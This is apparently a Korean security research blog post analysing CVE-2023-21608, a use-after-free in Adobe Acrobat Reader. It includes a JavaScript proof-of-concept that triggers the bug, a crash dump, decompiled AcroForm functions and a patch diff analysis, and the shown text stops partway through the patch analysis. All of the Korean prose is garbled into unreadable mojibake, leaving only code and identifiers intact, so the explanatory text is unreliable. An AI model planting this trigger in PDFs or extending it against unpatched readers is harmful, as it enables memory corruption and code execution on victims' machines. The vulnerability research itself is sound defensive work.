---
title: "[Research] 1day1document : CVE-2023-21608"
author: pwndorei
tags: [pwndorei, Adobe, UAF]
categories: [Research]
date: 2024-08-04 17:00:00
cc: true
index_img: /2024/08/04/pwndorei/1day1document_CVE-2023-21608/1day1document.jpg
---

# Init

ì•ˆë…•í•˜ì„¸ìš”! pwndoreiì…ë‹ˆë‹¤. ì˜¤ëŠ˜ì€ ì˜¤ëœë§Œì— ì—°êµ¬ê¸€ë¡œ ëŒì•„ì™”ìŠµë‹ˆë‹¤!

ì´ë²ˆ ê¸€ì—ì„œëŠ” ì œëª©ì²˜ëŸ¼ CVE-2023-21608ì˜ ë¶„ì„ ë° ìµìŠ¤í”Œë¡œì‡ ê³¼ì •ì„ ë‹¤ë£° ê²ƒì´ê³  í•˜ë£¨í•œì¤„ì— ì¢€ ë¶€ì¡±í•¨ì„ ëŠë¼ì…¨ì„ ë¶„ë“¤ì„ ìœ„í•œ í•˜ë£¨ í•œ ë¬¸ì„œì¯¤ ë˜ëŠ” ë¶„ëŸ‰ì…ë‹ˆë‹¤ ã…‹ã…‹ã…‹ã…‹

![8yf1gt.gif](1day1document_CVE-2023-21608/8yf1gt.gif)

# 1. ì·¨ì•½ì  ì •ë³´

---

## Description

CVE-2023-21608ì€ Adobe ì‚¬ì˜ PDF ë¬¸ì„œ í¸ì§‘, ë³€í™˜ í”„ë¡œê·¸ë¨ì¸ Acrobatê³¼ PDF ë·°ì–´ì¸ Acrobat Reader ì œí’ˆêµ°ì—ì„œ ë°œìƒí•œ Use-After-Free ì·¨ì•½ì ì…ë‹ˆë‹¤. ì•„ë˜ì˜ ì·¨ì•½í•œ ë²„ì „ì˜ í”„ë¡œê·¸ë¨ë“¤ì—ì„œ ì•…ì„± PDF ë¬¸ì„œë¥¼ ì—´ë©´ ë¬¸ì„œì— í¬í•¨ëœ Javascript ì½”ë“œê°€ ì‹¤í–‰ë˜ë©´ì„œ Use-After-Freeê°€ íŠ¸ë¦¬ê±°ë˜ê³  ì´ë¥¼ ìµìŠ¤í”Œë¡œì‡í•˜ì—¬ Remote Code Executionì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

## Affected Product & Version Information

- Adobe Acrobat 2020
    - version â‰¤ 20.005.30418
- Adobe Acrobat Reader 2020
    - version â‰¤ 20.005.30418
- Acrobat DC
    - version â‰¤ 22.003.20282
- Acrobat Reader DC
    - version â‰¤  22.003.20282

ì œ ê²½ìš°ì—ëŠ” ë¶„ì„ê³¼ ìµìŠ¤í”Œë¡œì‡ì„ ìœ„í•´ Adobe Acrobat Reader DC x86ì˜ 2022.001.20085 ë²„ì „ì„ ì‚¬ìš©í–ˆìŠµë‹ˆë‹¤!

# 2. ì·¨ì•½ì  ë¶„ì„

---

ë¨¼ì € ì•„ë˜ëŠ” Use-After-Freeë¥¼ ìœ ë°œí•˜ì—¬ í¬ë˜ì‹œë¥¼ ë°œìƒì‹œí‚¤ëŠ”ë° ì‚¬ìš©ëœ Javascript ì½”ë“œì…ë‹ˆë‹¤.

```jsx
var testField = this.getField("testField");

testField.richText = true;

testField.setAction("Calculate", "calculateCallback()");

try { this.resetForm(); } catch (e) {}

try { this.resetForm(); } catch (e) {}  // bug is triggered during this resetForm call

function calculateCallback()

{

  event.__defineGetter__("target", getterFunc);

  event.richValue = this;

}

function getterFunc()

{

  try { Object.defineProperty(testField, "textFont", { value: this }); } catch(e) { }

}
```

í•´ë‹¹ ì½”ë“œê°€ ì‚½ì…ëœ PDF ë¬¸ì„œì—ëŠ” ì•„ë˜ì™€ ê°™ì€ `testField`ë¼ëŠ” ì´ë¦„ì„ ê°€ì§€ëŠ” text fieldê°€ ì¡´ì¬í•©ë‹ˆë‹¤

```
5 0 obj
<<
/Type /Annot
/Subtype /Widget
/T (testField)
/FT /Tx
/Rect [0 0 0 0]
>>
```

ì½”ë“œê°€ ì‚½ì…ëœ ë¬¸ì„œë¥¼ ì—´ê²Œ ë˜ë©´ ìœ„ì˜ ìë°”ìŠ¤í¬ë¦½íŠ¸ ì½”ë“œê°€ ì‹¤í–‰ë˜ë©´ì„œ (1)ë¬¸ì„œ ì˜¤ë¸Œì íŠ¸ `doc`ì˜ Instanceì¸ `this`ì˜ `getField` ë©”ì†Œë“œë¥¼ í˜¸ì¶œí•˜ì—¬ `testField` ì˜¤ë¸Œì íŠ¸ë¥¼ ê°€ì ¸ì˜¤ê³  (2)`setAction` ë©”ì†Œë“œë¥¼ í†µí•´ `testField`ì˜  `Calculate` í•¸ë“¤ëŸ¬ë¡œ `calculateCallback` í•¨ìˆ˜ë¥¼ ì§€ì •í•´ì¤ë‹ˆë‹¤. ë°”ë¡œ ë‹¤ìŒ ì¤„ì—ì„œ ì‹¤í–‰ë˜ëŠ” (3)`this.resetForm()`ì€ `Calculate` í•¸ë“¤ëŸ¬ê°€ ì •ì˜ëœ ëª¨ë“  í•„ë“œ ì˜¤ë¸Œì íŠ¸ì— `calculate` ì´ë²¤íŠ¸ë¥¼ ë°œìƒì‹œì¼œ í•¸ë“¤ëŸ¬ê°€ í˜¸ì¶œë˜ë„ë¡ ë§Œë“­ë‹ˆë‹¤. `testField`ì˜ ê²½ìš°ì—ëŠ” (4)`calculateCallback`í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ê³  ì´ í•¨ìˆ˜ ì•ˆì—ì„œ `event`ì˜ `target` ì†ì„±ì— ëŒ€í•œ getterë¥¼ `getterFunc`ë¡œ ì¬ì •ì˜í•˜ê³  `richiValue` ì†ì„±ì— `this`ë¥¼ ëŒ€ì…í•©ë‹ˆë‹¤. 

ì´ë¡œ ì¸í•´ `richValue`ì— ëŒ€ì…ë  ê°’ì¸ `this` (`doc`)ì˜ ëª¨ë“  ì†ì„±ê³¼ ë©”ì†Œë“œê°€ `EScript!ESObjectEnum`í•¨ìˆ˜ì— ì˜í•´ ì¬ê·€ì ìœ¼ë¡œ ì—´ê±°ë˜ê¸° ì‹œì‘í•©ë‹ˆë‹¤. ì´ ê³¼ì •ì—ì„œ `event.target`ì— ì ‘ê·¼í•˜ê²Œ ë˜ì–´ `getterFunc` í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ê³  `testField.textFont`ê°€ `this`ë¡œ ë°”ë€Œê²Œ ë©ë‹ˆë‹¤.

ë‘ ë²ˆì§¸ `this.resetForm()`ì—ì„œë„ ìœ„ì™€ ê°™ì€ ë™ì‘ì´ ë°˜ë³µë˜ì§€ë§Œ `this`ë¡œ ë°”ë€ `testField.textFont`ê°€ ìˆ˜ì • ë¶ˆê°€ëŠ¥(non-configurable)í•˜ê¸° ë•Œë¬¸ì— `getterFunc`ì—ì„œ ì˜ˆì™¸ê°€ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤.

ë°œìƒí•œ ì˜ˆì™¸ë¡œ ì¸í•´ `event.richValue`ì— ì ‘ê·¼í•  ë•Œ í˜¸ì¶œë˜ëŠ” `AcroForm!GetRichValueEventProp`ì—ì„œ ì•„ë˜ì˜ ë¶„ê¸°ë¡œ ì§„ì…í•˜ì—¬ `CAggToESVal`í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ë©´ì„œ ì—´ê±° ê³¼ì •ì—ì„œ í• ë‹¹ëœ `CAgg`ì™€ `map` ì˜¤ë¸Œì íŠ¸ë¥¼ ëª¨ë‘ í•´ì œí•˜ê²Œ ë©ë‹ˆë‹¤.

```c
int __cdecl GetRichValueEventProp(wchar_t *arg0, int a2, int a3)
{
...
  else
  {
    LOBYTE(v16) = 0;
    sub_2085ECA0("EventRichValueInProgress");
    sub_20AAE7D6(arg0, v16, v17, v18, v19, 0, 15);
    if ( a1
      && (v9 = *(unsigned __int16 (__fastcall **)(int))(dword_21473CB8 + 180),
          v10 = __guard_check_icall_fptr(a1),
          v9(v10)) )
    {
      PointerType = sub_20A4AD65(a1, (wchar_t *)"richValue", (wchar_t *)"CAgg_P");
      if ( PointerType )
        PointerType = CAggToESVal(PointerType, v12, (wchar_t *)a3, PointerType);// Free All CAgg & map
    }
...
}
```

ì—¬ê¸°ê¹Œì§€ë§Œ ë³´ë©´ ë”±íˆ í° ë¬¸ì œëŠ” ì—†ì–´ ë³´ì´ì§€ë§Œ ì˜¤ë¸Œì íŠ¸ë“¤ì˜ í•´ì œê°€ ì—´ê±°ê°€ ì•„ì§ ëë‚˜ì§€ ì•Šì€ ìƒíƒœì—ì„œ ì´ë£¨ì–´ì§€ê¸° ë•Œë¬¸ì— ì´í›„ í•´ì œëœ ë©”ëª¨ë¦¬ì— ì ‘ê·¼í•˜ë©´ì„œ Use-After-Freeê°€ ë°œìƒí•©ë‹ˆë‹¤!!!

```
eax=04f6a0f0 ebx=00000000 ecx=420fefd0 edx=44e1cff8 esi=6921ef50 edi=420fefd0
eip=6c556b99 esp=04f6a0d0 ebp=04f6a0fc iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
AcroForm!CAgg::operator[](unsigned short)+0xe:
6c556b99 8b07            mov     eax,dword ptr [edi]  ds:002b:420fefd0=????????
```

page-heapì„ í™œì„±í™”í•˜ê³  ë²„ê·¸ë¥¼ íŠ¸ë¦¬ê±°í•´ë³´ë©´ Use-After-Freeë¡œ ì¸í•´ `AcroForm!CAgg::operator[]` ì—ì„œ ìœ„ì™€ ê°™ì€ í¬ë˜ì‹œê°€ ë°œìƒí•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ì˜ ë””ì»´íŒŒì¼ëœ ì½”ë“œì—ì„œ ë³´ë©´ ifë¬¸ ì•ˆì—ì„œ `this->type` ì— ì ‘ê·¼í•  ë•Œ ë°œìƒí–ˆë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆê³  ë”°ë¼ì„œ `this`ê°€ UAFê°€ ë°œìƒí•˜ëŠ” ë©”ëª¨ë¦¬ë¥¼ ê°€ë¦¬í‚¤ê³  ìˆë‹¤ê³  ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```c
int __userpurge CAgg::operator[]@<eax>(CAgg *this@<ecx>, bool (*a2)[27]@<ebx>, wchar_t *someID)
{
  ...

  if ( this->type == 0x13 )
  {
    ...
  }
  else
  {
    ...
    else
    {
      CAgg::convert(this, a2, 0x14);
      v4 = (_DWORD *)std::map<unsigned short,CAgg>::operator[](this->map, (int)v9, (unsigned __int16 *)&someID);
    }
    return *v4 + 24;
  }
}
```

í•´ë‹¹ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œ í•¨ìˆ˜ëŠ” ì•„ë˜ì˜ `AcroForm!EScript_ESObjectEnum_CallbackProc`í•¨ìˆ˜ë¡œ `CAgg:operator[]`ì˜ ì²« ë²ˆì§¸ ì¸ì(`this`)ë¡œ ì „ë‹¬ë˜ëŠ” `pCagg`ê°€ í•´ì œëœ ë©”ëª¨ë¦¬ë¥¼ ê°€ë¦¬í‚¤ë©° ì´ëŠ” `pCAggData`ê°€ ê°€ë¦¬í‚¤ëŠ” ë©”ëª¨ë¦¬ì—ì„œ ì½ì–´ì˜¨ ì£¼ì†Œì…ë‹ˆë‹¤.

```c
int __usercall EScript_ESObjectEnum_CallbackProc@<eax>(
        bool (*ebx0)[27]@<ebx>,
        int a2,
        wchar_t *key_str,
        wchar_t *a4,
        int ***pCAggData)
{
  CAgg **pCagg; // edi
  unsigned __int16 someID; // ax
  CAgg *v7; // eax

  pCagg = (CAgg **)*pCAggData;
  someID = (*(int (__cdecl **)(wchar_t *))(gCoreHFT + 20))(key_str); 
  v7 = (CAgg *)CAgg::operator[]((CAgg *)pCagg, ebx0, (wchar_t *)someID);
  ESValToCAgg(v7, a4, 0);
  return 1;
}
```

# 3.  íŒ¨ì¹˜ ë¶„ì„

---

ë²„ê·¸ê°€ Acrobatì˜ ìë°”ìŠ¤í¬ë¦½íŠ¸ ì—”ì§„ì—ì„œ ë°œìƒí•˜ê¸° ë•Œë¬¸ì— ì´ë¥¼ íŠ¸ë¦¬ê±°í•  ë•Œë„ ìë°”ìŠ¤í¬ë¦½íŠ¸ê°€ ì‚¬ìš©ë˜ê³  ë’¤ì—ì„œ ë‹¤ë£° ìµìŠ¤í”Œë¡œì‡ì—ì„œë„ ë§ˆì°¬ê°€ì§€ì…ë‹ˆë‹¤â€¦ í‰ì†Œì— ë³´ë˜ ì·¨ì•½ì ë“¤ê³¼ëŠ” ê²°ì´ ë‹¤ë¥´ë‹¤ëŠ”ê²Œ ëŠê»´ì§€ë„¤ìš” ğŸ¥²

ë°”ë¡œ ìµìŠ¤í”Œë¡œì‡ ê³¼ì •ì„ ì•Œì•„ë³´ê¸° ì „ì— ë¨¼ì € ì´ ì·¨ì•½ì ì´ ì–´ë–»ê²Œ íŒ¨ì¹˜ë˜ì—ˆëŠ”ì§€ í™•ì¸í•´ë´…ì‹œë‹¤! ê°„ë‹¨í•œ ì·¨ì•½ì ì€ ì•„ë‹Œ ë§Œí¼ íŒ¨ì¹˜ ë˜í•œ ì½”ë“œ í•œ ë‘ì¤„ì—ì„œ ëë‚ ë¦¬ ì—†ê² ì£ ? 

ë¨¼ì € ì·¨ì•½ì ì´ íŒ¨ì¹˜ëœ ë²„ì „(Adobe Acrobat Reader DC 2022.003.20310)ê³¼ ì·¨ì•½í•œ ë²„ì „(Adobe Acrobat Reader DC 2022.001.20085)ì˜ `AcroForm.api`ë¥¼ Diffingí•˜ì—¬ ì•„ë˜ì™€ ê°™ì€ ê²°ê³¼ë¥¼ ì–»ì„ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤!

![Untitled](1day1document_CVE-2023-21608/Untitled.png)

primaryì™€ secondaryëŠ” ê°ê° ì·¨ì•½í•œ ë²„ì „ê³¼ íŒ¨ì¹˜ëœ ë²„ì „ì˜ `AcroForm.api` ì´ê³  ë‘˜ ì‚¬ì´ì— matchëœ í•¨ìˆ˜ë“¤ ì¤‘ì—ì„œ ë²„ê·¸ë¥¼ íŠ¸ë¦¬ê±°í•˜ëŠ” ê³¼ì •ì—ì„œ í˜¸ì¶œë˜ëŠ” í•¨ìˆ˜ë“¤ì˜ ë³€ê²½ì ì„ ì‚´í´ë³¸ ê²°ê³¼ ì•„ë˜ì™€ ê°™ì´ `SetRichValueEventProp`ê³¼ `GetRichValueEventProp`, `SetRichChangeEventProp`ê³¼ `GetRichChangeEventProp`ì—ì„œ ì°¨ì´ê°€ ë°œìƒí•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.

![Untitled](1day1document_CVE-2023-21608/Untitled%201.png)

ì´ì¤‘ì—ì„œë„ `GetRichValueEventProp`ì˜ ì°¨ì´ë¥¼ í™•ì¸í•´ë³´ë©´ ì•„ë˜ì™€ ê°™ì€ë°ìš”?

![Untitled](1day1document_CVE-2023-21608/Untitled%202.png)

ë…¸ë€ìƒ‰ìœ¼ë¡œ í‘œì‹œëœ Basic Blockì€ íŒ¨ì¹˜ ì „í›„ë¡œ ì°¨ì´ê°€ ë°œìƒí•˜ì§€ë§Œ Matchë˜ëŠ” Basic Blockìœ¼ë¡œ ì™¼ìª½ì´ primary(íŒ¨ì¹˜ ì „), ì˜¤ë¥¸ìª½ì´ secondary(íŒ¨ì¹˜ í›„)ì´ë©° íŒŒë€ìƒ‰ì˜ ì½”ë“œì™€ Basic Blockì€ primaryì—ëŠ” ì—†ì§€ë§Œ secondaryì—ëŠ” ì¡´ì¬í•˜ëŠ” ë¶€ë¶„ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ì¦‰ íŒ¨ì¹˜ë¡œ ì¶”ê°€ëœ íŒŒë€ìƒ‰ ë¶€ë¶„ì´ ì·¨ì•½ì ì„ í•´ê²°í•˜ëŠ” ì½”ë“œë¼ê³  ë³¼ ìˆ˜ ìˆëŠ”ê±°ì£ .

ì´ë¥¼ í†µí•´ `GetRichValueEventProp`ì—ëŠ” í¬ê²Œ ì•„ë˜ì˜ ë‘ ê°€ì§€ ë³€ê²½ì ì´ ì¡´ì¬í•˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.

1. ë²„ê·¸ê°€ íŠ¸ë¦¬ê±°ë˜ëŠ” `CAggToESVal` í•¨ìˆ˜ í˜¸ì¶œ ì „, `IsDataInGlobalHashTable` í•¨ìˆ˜ì˜ í˜¸ì¶œì´ ì„ í–‰ë˜ê³  ì´ í•¨ìˆ˜ì˜ ë°˜í™˜ ê°’ì´ `CAggToESVal`ì´ í˜¸ì¶œë˜ëŠ” Basic Blockìœ¼ë¡œì˜ ë¶„ê¸° ì—¬ë¶€ë¥¼ ê²°ì •
2. `CAggToESVal`ì´ í˜¸ì¶œë˜ëŠ” Basic Blockì—ì„œëŠ” í•¨ìˆ˜ í˜¸ì¶œ ì „í›„ë¡œ ê°ê° `InsertToGlobalHashTable`ê³¼ `DeleteFromGlobalHashTable` í•¨ìˆ˜ë¥¼ í˜¸ì¶œ

ë””ì»´íŒŒì¼ëœ ì½”ë“œë¥¼ ë³´ë©´ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤!

```c
      PointerType = sub_20A4BC05(v31, (wchar_t *)"richValue");
      PointerType_1 = PointerType;
      if ( PointerType )
      {
        LOBYTE(PointerType) = IsDataInGlobalHashTable(PointerType);
        if ( !(_BYTE)PointerType )
        {
          v15 = InsertToGlobalHashTable((int)&v31, PointerType_1);
          LOBYTE(v33) = 4;
          CAggToESVal((int)v15, v16, PropName, PointerType_1);
          PointerType = DeleteFromGlobalHashTable((int)&v31);
        }
      }
    }
```

`AcroForm.api`ì€ ì‹¬ë³¼ì´ ì—†ê¸° ë•Œë¬¸ì— í•¨ìˆ˜ë“¤ì„ ì •ì„±ìŠ¤ëŸ½ê²Œ ë¶„ì„í•´ë³¸ ê²°ê³¼ í•´ì‹œ í…Œì´ë¸”ê³¼ ê´€ë ¨ëœ í•¨ìˆ˜ë“¤ì´ë¼ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆì—ˆê³  `InsertToGlobalHashTable`ì™€ `DeleteFromGlobalHashTable` í•¨ìˆ˜ ë“± ê°ê°ì˜ í•¨ìˆ˜ì˜ ê¸°ëŠ¥ì— ë”°ë¼ ì´ë¦„ì„ ë¶™ì˜€ìŠµë‹ˆë‹¤.

ì¶”ê°€ëœ í•¨ìˆ˜ë“¤ì˜ ë™ì‘ì„ ë¶„ì„í•œ ê²°ê³¼ ì—´ê±° ë„ì¤‘ì— ì˜¤ë¸Œì íŠ¸ë“¤ì´ freeë˜ëŠ” ë²„ê·¸ì˜ ë°œìƒì„ ë§‰ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆì—ˆê³  ê°ê°ì˜ í•¨ìˆ˜ë¥¼ ë¶„ì„í•œ ë‚´ìš©ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.

## IsDataInGlobalHashTable

```c
bool __cdecl IsDataInGlobalHashTable(int Data)
{
  int v1; // ecx
  int a2; // [esp+0h] [ebp-4h] BYREF

  a2 = v1;
  return Data && sub_20AD638B(&GlobalHashTable, (ListEntry *)&a2, (int)&Data)->Flink != GlobalHashTable.DefaultHead;
}
```

ë””ì»´íŒŒì¼ëœ ì½”ë“œëŠ” ìœ„ì™€ ê°™ìœ¼ë©° `sub_20AD638B`ë¥¼ í˜¸ì¶œí•˜ì—¬ `GlobalHashTable`ì— `Data`ê°€ ì €ì¥ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.

`GlobalHashTable`ì€ ìë£Œí˜•ì´ ì•„ë˜ì˜ `HashTable` êµ¬ì¡°ì²´ì¸ ì „ì—­ ë³€ìˆ˜ë¡œ ì—°ê´€ëœ ëª¨ë“  êµ¬ì¡°ì²´ë“¤ì˜ ëª…ì¹­ê³¼ ì •ì˜ëŠ” ë¶„ì„ì„ í†µí•´ ìœ ì¶”í•œ ê²ƒì…ë‹ˆë‹¤.

### HashTable

```
00000000 ListEntry       struc ; (sizeof=0x8, mappedto_221)
00000000                                         
00000000                                         
00000000 Flink           dd ?                    
00000004 Blink           dd ?                    
00000008 ListEntry       ends
00000008
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 HashBucketEntry struc ; (sizeof=0x10, mappedto_223)
00000000                                         
00000000 list_entry      union1 ?                
00000000                                         
00000008 Data            dd ?                    
00000008                                         
0000000C field_C         dd ?                    
00000010 HashBucketEntry ends
00000010
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 HashTable       struc ; (sizeof=0x30, mappedto_224)
00000000                                         
00000000 unknown0        dd ?
00000004 DefaultHead     dd ?                    
00000004                                         
00000008 length          dd ?
0000000C HashBuckets     HashBucketTable ?       
00000020 field_20        dd ?                    
00000020                                         
00000024 field_24        dd ?
00000028 field_28        dd ?                    
00000028                                         
0000002C field_2C        dd ?                    
0000002C                                         
00000030 HashTable       ends
00000030
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 HashBucketTable struc ; (sizeof=0x14, mappedto_227)
00000000                                         
00000000 HashBucketBegin dd ?                    
00000004 HashBucketEnd   dd ?                    
00000008 HashBucketUnknown dd ?                  
0000000C BucketMaxIndex  dd ?
00000010 BucketCount     dd ?
00000014 HashBucketTable ends
00000014
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 HashBucketEntryHeader struc ; (sizeof=0x8, mappedto_228)
00000000                                         
00000000 BucketHead      dd ?                    
00000004 BucketTail      dd ?                    
00000008 HashBucketEntryHeader ends
00000008
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 union1          union ; (sizeof=0x8, mappedto_229)
00000000                                         
00000000                                         
00000000 list_entry      ListEntry ?
00000000 entry_header    HashBucketEntryHeader ?
00000000 union1          ends
00000000
```

`HashTable`ì€ í•´ì‹œ í…Œì´ë¸” êµ¬í˜„ì„ ìœ„í•œ êµ¬ì¡°ì²´ë¡œ `HashTable.DefaultHead`ë¶€í„° ì‹œì‘ë˜ëŠ” ì›í˜• ì´ì¤‘ ì—°ê²° ë¦¬ìŠ¤íŠ¸ë¡œ ë°ì´í„°ë¥¼ ê´€ë¦¬í•©ë‹ˆë‹¤. ì›í˜• ì´ì¤‘ ì—°ê²° ë¦¬ìŠ¤íŠ¸ëŠ” `HashBucketEntry` êµ¬ì¡°ì²´ë¡œ ì´ë£¨ì–´ì ¸ ìˆìœ¼ë©° ì›í˜• ì—°ê²° ë¦¬ìŠ¤íŠ¸ì˜ ì—°ì†ì ì¸ ì¼ë¶€ë¶„ì´ ê°ê°ì˜ ë²„í‚·ì´ ë˜ì–´ í•´ì‹œ í…Œì´ë¸”ì„ êµ¬ì„±í•©ë‹ˆë‹¤.

í•´ì‹œ í…Œì´ë¸”ì„ ì´ë£¨ëŠ” ë²„í‚·ë“¤ì— ëŒ€í•œ ì •ë³´ëŠ” `HashBucketTable` êµ¬ì¡°ì²´ì¸ `HashTable.HashBuckets`ì— ì €ì¥ë˜ì–´ ìˆê³  `HashBucketTable.HashBucketBegin`ì´ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œë¶€í„° `HashBucketTable.HashBucketEnd`ê°€ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œê¹Œì§€ `HashBucketTable.BucketCount` ê¸¸ì´ì˜ `HashBucketEntryHeader` ë°°ì—´ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ êµ¬ì¡°ë¥¼ ê·¸ë¦¼ìœ¼ë¡œ ë‚˜íƒ€ë‚´ë©´ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.

![Untitled](1day1document_CVE-2023-21608/Untitled%203.png)

`HashBucketEntryHeader` ë°°ì—´ì—ëŠ” ì•„ë˜ì™€ ê°™ì´ ì›í˜• ì´ì¤‘ ì—°ê²° ë¦¬ìŠ¤íŠ¸ì—ì„œ íŠ¹ì • ë²„í‚·ì— í•´ë‹¹í•˜ëŠ” ì—°ì†ëœ ë…¸ë“œë“¤ì„ ì´ì¤‘ ì—°ê²° ë¦¬ìŠ¤íŠ¸ë¡œ ê´€ë¦¬í•˜ê³  ì´ ì—°ê²° ë¦¬ìŠ¤íŠ¸ì˜ Headì™€ Tail ë…¸ë“œë¥¼ `BucketHead`ì™€ `BucketTail`ì— ì €ì¥í•©ë‹ˆë‹¤. ë¹„ì–´ìˆëŠ” ë²„í‚·ì˜ ê²½ìš°ì—ëŠ” `BucketHead`ì™€ `BucketTail`ì´ ëª¨ë‘ `HashTable.DefaultHead`ì…ë‹ˆë‹¤.

![Untitled](1day1document_CVE-2023-21608/Untitled%204.png)

ìœ„ì™€ ê°™ì€ ë‚´ìš©ì„ ë¶„ì„í•˜ë©´ì„œ ì •ë§ ì˜¤ëœë§Œì— ë¦¬ë²„ì‹±ì´ ì¬ë¯¸ìˆëŠ” ìˆœê°„ì´ì—ˆìŠµë‹ˆë‹¤ë§Œâ€¦ ìì£¼ í•˜ê³  ì‹¶ì§„ ì•Šêµ°ìš”â€¦ 

ë¬´íŠ¼ ì´ëŸ¬í•œ êµ¬ì¡°ë¥¼ ê°–ëŠ” `HashTable`ì„ ì¸ìë¡œ í˜¸ì¶œëœ `sub_20AD638B`ëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.

### sub_20AD638B

```c
ListEntry *__thiscall sub_20AD638B(HashTable *hashTable, ListEntry *a2, _DWORD *pData)
{
  int DataHash; // eax
  HashBucketEntry *v5; // ecx
  ListEntry *result; // eax
  ListEntry returnPtr; // [esp+4h] [ebp-8h] BYREF

  DataHash = hashFunction(0x811C9DC5, pData, 4u);
  v5 = FindDataFromHashTable(hashTable, &returnPtr, pData, DataHash)->Blink;
  if ( !v5 )
    v5 = hashTable->DefaultHead;
  result = a2;
  a2->Flink = v5;                              
  return result;
}
```

ë¨¼ì € ì•„ë˜ì˜ `hashFunction`ì„ í˜¸ì¶œí•˜ì—¬ `pData`ê°€ ê°€ë¦¬í‚¤ëŠ” ë°ì´í„°ë¥¼ í•´ì‹±í•©ë‹ˆë‹¤. 

```c
int __cdecl hashFunction(int a1, _BYTE *a2, unsigned int len)
{
  unsigned int i; // edx

  for ( i = 0; i < len; ++i )
    a1 = 0x1000193 * (a1 ^ (unsigned __int8)a2[i]);
  return a1;
}
```

ì´í›„ `hashFunction`ì´ ë°˜í™˜í•œ `DataHash`ë¥¼ ì¸ìë¡œ ì‚¬ìš©í•˜ì—¬ `FindDataFromHashTable` í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.

### FindDataFromHashTable

```c
ListEntry *__thiscall FindDataFromHashTable(HashTable *hashTable, ListEntry *returnPtr, _DWORD *pData, int DataHash)
{
  int idx; // eax
  HashBucketEntryHeader *v5; // esi
  HashBucketEntry *v6; // ecx
  HashBucketEntry *v7; // edx
  ListEntry *result; // eax

  idx = DataHash & hashTable->HashBuckets.BucketMaxIndex;// Hash & 7
  v5 = hashTable->HashBuckets.HashBucketBegin;  
  v6 = hashTable->DefaultHead;                  // default header
  v7 = v5[idx].BucketTail;                     
  if ( v7 == v6 )                               // bucket is empty
  {
    result = returnPtr;
    returnPtr->Blink = 0;
LABEL_8:
    result->Flink = v6;
  }
  else
  {
    while ( 1 )                                 // Traverse Bucket(doubly linked list)
                                                // from Tail to Head
    {
      if ( *pData == v7->Data )                 // Data Found
      {
        result = returnPtr;
        v6 = v7->list_entry.list_entry.Flink;
        returnPtr->Blink = v7;                  // returnPtr->Filnk = found->Flink
                                                // returnPtr->Blink = found
        goto LABEL_8;
      }
      if ( v7 == v5[idx].BucketHead )
        break;
      v7 = v7->list_entry.list_entry.Blink;
    }
    result = returnPtr;
    returnPtr->Blink = 0;
    returnPtr->Flink = v7;
  }
  return result;                                // Data not found
                                                // 
                                                // returnPtr->Flink = BucketHead
                                                // returnPtr->Blink = NULL;
}
```

ì´ í•¨ìˆ˜ì—ì„œëŠ” ë¨¼ì € `DataHash`ë¥¼ í†µí•´ íƒìƒ‰í•  `HashBucketEntryHeader`ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤. íƒìƒ‰ì€ `BucketTail`ë¶€í„° `Blink`ë¥¼ ë”°ë¼ `BucketHead`ì— ë„ë‹¬í•  ë•Œê¹Œì§€ ì´ë£¨ì–´ì§€ê³  ë§Œì•½ `BucketTail`ì´ `DefaultHead`ì¸ ê²½ìš° í•´ë‹¹ ë²„í‚·ì€ ë¹„ì–´ìˆë‹¤ëŠ” ê²ƒì´ê¸°ì— íƒìƒ‰ì„ ì§„í–‰í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

ë²„í‚·ì´ ë¹„ì–´ìˆì§€ ì•Šë‹¤ë©´ íƒìƒ‰ ê²°ê³¼ë¥¼ ë‘ ë²ˆì§¸ ì¸ìë¡œ ì „ë‹¬ëœ `returnPtr`ì— ì €ì¥í•˜ê³  ì´ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.

